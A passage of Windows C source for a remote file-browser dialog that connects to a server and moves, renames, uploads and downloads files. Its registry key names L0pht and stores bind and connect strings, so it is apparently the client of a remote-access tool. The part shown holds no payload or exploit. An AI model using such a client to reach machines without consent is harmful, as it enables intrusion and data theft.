								HCURSOR curOld=SetCursor(LoadCursor(g_hInstance,MAKEINTRESOURCE(IDC_DRAGCOPYPOINTER)));
								bCopy=TRUE;
							}
						}
						if(msg.message==WM_KEYUP) {
							if(msg.wParam==VK_CONTROL && bCopy) {
								bCopy=FALSE;
								DestroyCursor(SetCursor(curOld));
								HCURSOR curOld=SetCursor(LoadCursor(g_hInstance,MAKEINTRESOURCE(IDC_DRAGPOINTER)));
							}
						}
					}
					ClipCursor(NULL);
					DestroyCursor(SetCursor(curOld));
					SetCapture(capOld);
									
					if(bCancel) return FALSE;

					// Move selected items to directory that is in focus
					EXFILEINFO *exfi_d,*exfi_s;
					count=ListView_GetItemCount(pnmh->hwndFrom);
					for(i=0;i<count;i++) {
						if(ListView_GetItemState(pnmh->hwndFrom,i,LVIS_FOCUSED) & LVIS_FOCUSED) break;
					}
					if(i==count) return FALSE;
					
					LVITEM lvi;
					lvi.mask=LVIF_PARAM;
					lvi.iItem=i;
					lvi.iSubItem=0;
					ListView_GetItem(pnmh->hwndFrom,&lvi);
					exfi_d=(EXFILEINFO *)lvi.lParam;
					if(exfi_d->nType!=0) return FALSE;

					for(i=0;i<count;i++) {
						if(ListView_GetItemState(pnmh->hwndFrom,i,LVIS_SELECTED) & LVIS_SELECTED) {
							char svPath[260];
							lvi.mask=LVIF_PARAM;
							lvi.iItem=i;
							lvi.iSubItem=0;
							ListView_GetItem(pnmh->hwndFrom,&lvi);
							exfi_s=(EXFILEINFO *)lvi.lParam;
							lstrcpyn(svPath,exfi_d->svName,260);
							lstrcpyn(svPath+lstrlen(svPath),"\\",260-lstrlen(svPath));
							lstrcpyn(svPath+lstrlen(svPath),exfi_s->svName,260-lstrlen(svPath));
							if(RenameItem(excontext,exfi_s->svName,svPath,bCopy,TRUE)) {
								if(!bCopy) {
									// remove from listview
									ListView_DeleteItem(pnmh->hwndFrom,i);
									i--;
									count--;
									
									// remove from internal list
									EXFILEINFO *fi=excontext->pFiles;
									if(fi==exfi_s) {
										excontext->pFiles=exfi_s->pNext;
									} else while(fi!=NULL) {
										if(fi->pNext==exfi_s) {
											fi->pNext=exfi_s->pNext;
											break;
										}
										fi=fi->pNext;
									}
									free(exfi_s);	
								}
							}
						}
					}

				}
				return FALSE;
			}
		}
		return FALSE;

	case WM_GOTOLOCATION:
		GoToDirectory(excontext);
		return TRUE;

	case WM_COMMAND:
		wNotifyCode = HIWORD(wParam); // notification code 
		wID = LOWORD(wParam);         // item, control, or accelerator identifier 
		hwndCtl = (HWND) lParam;      // handle of control 
		switch(wID) {
		case IDM_NEWFOLDER:
			if(excontext->pSock!=NULL) {
				CreateNewFolder(excontext);
			}
			return TRUE;
		case IDM_RENAME:
			if(excontext->pSock!=NULL) {
				int count,nItem;
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				count=ListView_GetItemCount(hlv);
				for(nItem=0;nItem<count;nItem++) {
					if(ListView_GetItemState(hlv,nItem,LVIS_FOCUSED) & LVIS_FOCUSED) break;
				}
				if(nItem==count) return FALSE;
				ListView_EditLabel(hlv,nItem);
			}
			return TRUE;
		case IDM_DELETE:
			if(excontext->pSock!=NULL) {
				DeleteItems(excontext);
			}	
			return TRUE;
		case IDM_CLOSE:
			SendMessage(excontext->hDialog,WM_CLOSE,0,0);
			return TRUE;
		case IDM_VIEWLARGE:
			{
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				SetWindowLong(hlv,GWL_STYLE,GetWindowLong(hlv,GWL_STYLE) & ~(LVS_ICON|LVS_SMALLICON|LVS_LIST|LVS_REPORT) | LVS_ICON);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLARGE,  MF_CHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWSMALL,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLIST,   MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWDETAILS,MF_UNCHECKED);
			}
			return TRUE;
		case IDM_VIEWSMALL:
			{
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				SetWindowLong(hlv,GWL_STYLE,GetWindowLong(hlv,GWL_STYLE) & ~(LVS_ICON|LVS_SMALLICON|LVS_LIST|LVS_REPORT) | LVS_SMALLICON);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLARGE,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWSMALL,  MF_CHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLIST,   MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWDETAILS,MF_UNCHECKED);
			}
			return TRUE;
		case IDM_VIEWLIST:
			{
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				SetWindowLong(hlv,GWL_STYLE,GetWindowLong(hlv,GWL_STYLE) & ~(LVS_ICON|LVS_SMALLICON|LVS_LIST|LVS_REPORT) | LVS_LIST);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLARGE,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWSMALL,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLIST,   MF_CHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWDETAILS,MF_UNCHECKED);
			}
			return TRUE;
		case IDM_VIEWDETAILS:
			{
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				SetWindowLong(hlv,GWL_STYLE,GetWindowLong(hlv,GWL_STYLE) & ~(LVS_ICON|LVS_SMALLICON|LVS_LIST|LVS_REPORT) | LVS_REPORT);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLARGE,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWSMALL,  MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWLIST,   MF_UNCHECKED);
				CheckMenuItem(GetSubMenu(GetMenu(excontext->hDialog),2),IDM_VIEWDETAILS,MF_CHECKED);
			}
			return TRUE;
		case IDM_ARRANGENAME:
			if(excontext->nLastSort==0) {
				excontext->bSortDir[0]=!excontext->bSortDir[0];
			}
			excontext->nLastSort=0;
			ListView_SortItems(GetDlgItem(hwndDlg,IDC_FILELIST),SortListItems,(LPARAM)excontext);
			return TRUE;
		case IDM_ARRANGETYPE:
			if(excontext->nLastSort==2) {
				excontext->bSortDir[2]=!excontext->bSortDir[2];
			}
			excontext->nLastSort=2;
			ListView_SortItems(GetDlgItem(hwndDlg,IDC_FILELIST),SortListItems,(LPARAM)excontext);
			return TRUE;
		case IDM_ARRANGESIZE:
			if(excontext->nLastSort==1) {
				excontext->bSortDir[1]=!excontext->bSortDir[1];
			}
			excontext->nLastSort=1;
			ListView_SortItems(GetDlgItem(hwndDlg,IDC_FILELIST),SortListItems,(LPARAM)excontext);
			return TRUE;
		case IDM_ARRANGEDATE:
			if(excontext->nLastSort==3) {
				excontext->bSortDir[3]=!excontext->bSortDir[3];
			}
			excontext->nLastSort=3;
			ListView_SortItems(GetDlgItem(hwndDlg,IDC_FILELIST),SortListItems,(LPARAM)excontext);
			return TRUE;
			

		case IDM_REFRESH:
			if(excontext->pSock!=NULL) {
				GoToDirectory(excontext);
			}
			InvalidateRect(excontext->hDialog,NULL,TRUE);
			return TRUE;
		case IDM_CONNECT:
		case IDM_DISCONNECT:
			if(excontext->pSock==NULL) {
				if(ExploreConnect(excontext)==-1) {
					MessageBox(excontext->hDialog,"Could not connect to server.\n","Connection error",MB_OK|MB_SETFOREGROUND|MB_TOPMOST|MB_ICONWARNING);	
				}
			} else {
				ExploreDisconnect(excontext);
			}
			return TRUE;
		case IDC_GODIR:
			SendMessage(hwndDlg,WM_GOTOLOCATION,0,0);
			return TRUE;
		case IDC_GOUPDIR:
			lstrcpyn(svName,"..",260);
			lstrcpyn(excontext->svLocation+lstrlen(excontext->svLocation),svName,260-lstrlen(excontext->svLocation));
			lstrcpyn(svName,excontext->svLocation,260);
			GetFullPathName(svName,260,excontext->svLocation,&svFilePart);
			
			SetDlgItemText(hwndDlg,IDC_LOCATION,excontext->svLocation);
			SendMessage(hwndDlg,WM_GOTOLOCATION,0,0);
			return TRUE;
		case ID_EDIT_CUT:
		case ID_EDIT_COPY:
			{
				int i,count;
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				excontext->bCut=(wID==ID_EDIT_CUT)?TRUE:FALSE;
				count=ListView_GetSelectedCount(hlv);
				if(excontext->svClipboard!=NULL) {
					free(excontext->svClipboard);
				}
				excontext->svClipboard=(char *)malloc(count*261+1);
				char *str=excontext->svClipboard;
				
				count=ListView_GetItemCount(hlv);
				for(i=0;i<count;i++) {
					if(ListView_GetItemState(hlv,i,LVIS_SELECTED) & LVIS_SELECTED) {
						char svPath[260],svName[260],*svFilePart;
						ListView_GetItemText(hlv,i,0,svName,260);
						lstrcpyn(svPath,excontext->svLocation,260);
						lstrcpyn(svPath+lstrlen(svPath),svName,260-lstrlen(svPath));
						GetFullPathName(svPath,260,str,&svFilePart);
						
						str+=lstrlen(str)+1;
					}
				}
				str[0]='\0';
			}
			return TRUE;
		case ID_EDIT_PASTE:
			{
				char *str=excontext->svClipboard;
				if(str==NULL) return FALSE;
				while(str[0]!='\0') {
					char svPath[260],svName[260],*svFilePart;
					GetFullPathName(str,260,svName,&svFilePart);
					lstrcpyn(svPath,excontext->svLocation,260);
					lstrcpyn(svPath+lstrlen(svPath),svFilePart,260-lstrlen(svPath));
					RenameItem(excontext,str,svPath,!excontext->bCut,FALSE);
						
					str+=lstrlen(str)+1;
				}
				GoToDirectory(excontext);
			}
			return TRUE;
		case IDM_SELECTALL:
			{
				int i,count;
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				count=ListView_GetItemCount(hlv);
				for(i=0;i<count;i++) {
					ListView_SetItemState(hlv,i,LVIS_SELECTED,LVIS_SELECTED);
				}
			}
			return TRUE;
		case IDM_INVERTSELECTION:
			{
				int i,count;
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				count=ListView_GetItemCount(hlv);
				for(i=0;i<count;i++) {
					ListView_SetItemState(hlv,i,ListView_GetItemState(hlv,i,LVIS_SELECTED)^LVIS_SELECTED,LVIS_SELECTED);
				}
			}
			return TRUE;
		case IDM_PROPERTIES:
			DoProperties(excontext);
			return TRUE;
		case IDM_OPTIONS:
			DoTransferProperties(excontext);
			return TRUE;
		case IDM_DOWNLOADSELECTED:
			{
				int i,count;
				HWND hlv=GetDlgItem(excontext->hDialog,IDC_FILELIST);
				if(ListView_GetSelectedCount(hlv)<=0) {
					MessageBox(excontext->hDialog,"No files selected.","Download error.",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
					return TRUE;
				}
				
				BROWSEINFO bi;
				memset(&bi,0,sizeof(BROWSEINFO));
				bi.hwndOwner=excontext->hDialog;
				bi.ulFlags=BIF_RETURNONLYFSDIRS;
				bi.lpszTitle="Choose download destination path:";
				LPITEMIDLIST pidl;
				if((pidl=SHBrowseForFolder(&bi))!=NULL) {
					char svDstPath[260],svSrcPath[260],svPath[260],*svFilePart;;
					
					count=ListView_GetItemCount(hlv);
					for(i=0;i<count;i++) {
						LVITEM lvi;
						lvi.iItem=i;
						lvi.iSubItem=0;
						lvi.mask=LVIF_PARAM|LVIF_STATE;
						lvi.stateMask=LVIS_SELECTED;
						ListView_GetItem(hlv,&lvi);
						if(lvi.state & LVIS_SELECTED) {
							EXFILEINFO *exfi=(EXFILEINFO *)lvi.lParam;
							// Make source path
							lstrcpyn(svPath,excontext->svLocation,260);
							if(lstrlen(svPath)>0) {
								if(svPath[lstrlen(svPath)-1]!='\\') {
									lstrcpyn(svPath+lstrlen(svPath),"\\",260-lstrlen(svPath));
								}
							}
							lstrcpyn(svPath+lstrlen(svPath),exfi->svName,260-lstrlen(svPath));
							GetFullPathName(svPath,260,svSrcPath,&svFilePart);
							// Make dest path
							SHGetPathFromIDList(pidl,svPath);							
							if(lstrlen(svPath)>0) {
								if(svPath[lstrlen(svPath)-1]!='\\') {
									lstrcpyn(svPath+lstrlen(svPath),"\\",260-lstrlen(svPath));
								}
							}
							lstrcpyn(svPath+lstrlen(svPath),exfi->svName,260-lstrlen(svPath));
							GetFullPathName(svPath,260,svDstPath,&svFilePart);

							
							DownloadFile(excontext,svSrcPath,svDstPath);
						}
					}
				}
			}
			return TRUE;
		case IDM_UPLOAD:
			{
				char *svFiles=(char *)malloc(32000);
				svFiles[0]='\0';
				char svTitle[260];

				OPENFILENAME ofn;
				memset(&ofn,0,sizeof(OPENFILENAME));
				ofn.lStructSize=sizeof(OPENFILENAME);
				ofn.hwndOwner=excontext->hDialog;
				ofn.hInstance=g_hInstance;
				ofn.lpstrFile=svFiles;
				ofn.nMaxFile=32000;
				ofn.lpstrFileTitle=svTitle;
				ofn.nMaxFileTitle=260;
				ofn.lpstrTitle="Upload Files";
				ofn.lpstrFilter="All Files (*.*)\0*.*\0";
				ofn.Flags=OFN_ALLOWMULTISELECT|OFN_EXPLORER|OFN_ENABLESIZING|OFN_FILEMUSTEXIST|OFN_PATHMUSTEXIST|OFN_HIDEREADONLY;
				if(GetOpenFileName(&ofn)) {
					if(svFiles[ofn.nFileOffset-1]=='\0') {
						char svFullName[260];
						char *svFile=svFiles;
						while(svFile[0]!='\0') svFile++;
						svFile++;
						while(svFile[0]!='\0') {
							lstrcpyn(svFullName,svFiles,260);
							if(lstrlen(svFullName)>0) {
								if(svFullName[lstrlen(svFullName)-1]!='\\') {
									lstrcpyn(svFullName+lstrlen(svFullName),"\\",260-lstrlen(svFullName));
								}
							}
							lstrcpyn(svFullName+lstrlen(svFullName),svFile,260-lstrlen(svFullName));
			
							UploadFile(excontext,svFullName);
	
							while(svFile[0]!='\0') svFile++;
							svFile++;
						}
					} else {
						UploadFile(excontext,svFiles);
					}
					GoToDirectory(excontext);
				} else {
					DWORD err=CommDlgExtendedError();
					if(err==FNERR_BUFFERTOOSMALL) {
						MessageBox(excontext->hDialog,"Too many files selected.","Upload error",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
					}
				}

				free(svFiles);
			}
			return TRUE;
		}

		return FALSE;
	case WM_DROPFILES:
		{
			HDROP hDrop=(HDROP)wParam;
			char svFile[260];
			int i,count=DragQueryFile(hDrop,0xFFFFFFFF,svFile,260);
			for(i=0;i<count;i++) {
				DragQueryFile(hDrop,i,svFile,260);
				UploadFile(excontext,svFile);
			}
			DragFinish(hDrop);
			GoToDirectory(excontext);
		}
		return TRUE;
	case WM_DESTROY:
		// Unsubclass edit control
		{
			HWND hLoc=GetDlgItem(excontext->hDialog,IDC_LOCATION);
			SetWindowLong(hLoc,GWL_WNDPROC,GetWindowLong(hLoc,GWL_USERDATA));
			hLoc=GetDlgItem(excontext->hDialog,IDC_FILELIST);
			SetWindowLong(hLoc,GWL_WNDPROC,GetWindowLong(hLoc,GWL_USERDATA));
		}

		// Clear File List
		ListView_DeleteAllItems(GetDlgItem(hwndDlg,IDC_FILELIST));
		if(excontext) {
			
			// Save options
			HKEY key;
			RegCreateKey(HKEY_CURRENT_USER,"Software\\L0pht\\Filesystem Browser",&key);
			RegSetValueEx(key,"Random Binding",NULL,REG_DWORD,(BYTE *)&(excontext->bRandomBind),sizeof(BOOL));
			RegSetValueEx(key,"Binding String",NULL,REG_SZ,(BYTE *)(excontext->svBindStr),260);
			RegSetValueEx(key,"Connect String",NULL,REG_SZ,(BYTE *)(excontext->svConnectStr),260);
			RegCloseKey(key);

			// Delete file information
			EXFILEINFO *pFile=excontext->pFiles,*pNext;
			while(pFile!=NULL) {
				pNext=pFile->pNext;
				free(pFile);
				pFile=pNext;
			}

			// Clean up image list
			DestroyIcon(excontext->hSmallIcon);
			DestroyIcon(excontext->hLargeIcon);
			DestroyIcon(excontext->hGoIcon);
			DestroyIcon(excontext->hGoUpIcon);
			if(excontext->pSock!=NULL) ExploreDisconnect(excontext);
		}
	
		return TRUE;
	}
	
	return FALSE;
}

// ExploreThread: File browser thread

DWORD WINAPI ExploreThread(THREAD_ARGS *pArgs)
{
	HWND hParent,hExploreDlg;

	// Thread housekeeping
	InterlockedIncrement(&g_nNumThreads);
	hParent=pArgs->hParent;
	free(pArgs);

	// Create context to keep vidstream info
	EXPLORE_CONTEXT *excontext=(EXPLORE_CONTEXT *) malloc(sizeof(EXPLORE_CONTEXT));	
	if(excontext==NULL) {
		InterlockedDecrement(&g_nNumThreads);
		return -1;
	}	
	excontext->hParent=hParent;
	excontext->pSock=NULL;
	
	// Create file browser window
	hExploreDlg=CreateDialogParam(g_hInstance,MAKEINTRESOURCE(IDD_EXPLORE),hParent,ExploreDlgProc,(LPARAM)excontext);

	MSG msg;
	while(g_bActive) {
		Sleep(20);
		
		// ---------------- Handle message processing ----------------
		if(PeekMessage(&msg,NULL,0,0,PM_REMOVE)) {
			if(msg.message==WM_QUIT) goto doneexclient;
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		// --------------- Handle explore socket ------------------
		if(excontext->pSock==NULL) continue;

	}
doneexclient:;
	DestroyWindow(hExploreDlg);

	free(excontext);	
	InterlockedDecrement(&g_nNumThreads);

	return 0;
}
	

int CreateExploreClient(HWND hParent)
{
	DWORD dwtid;
	HANDLE htd;
	
	THREAD_ARGS *pArgs=(THREAD_ARGS *) malloc(sizeof(THREAD_ARGS));
	if(pArgs==NULL) return NULL;
	
	pArgs->hParent=NULL;
	htd=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)ExploreThread,pArgs,0,&dwtid);
	if(htd==NULL) {
		return -1;
	}
	CloseHandle(htd);
	return 0;
}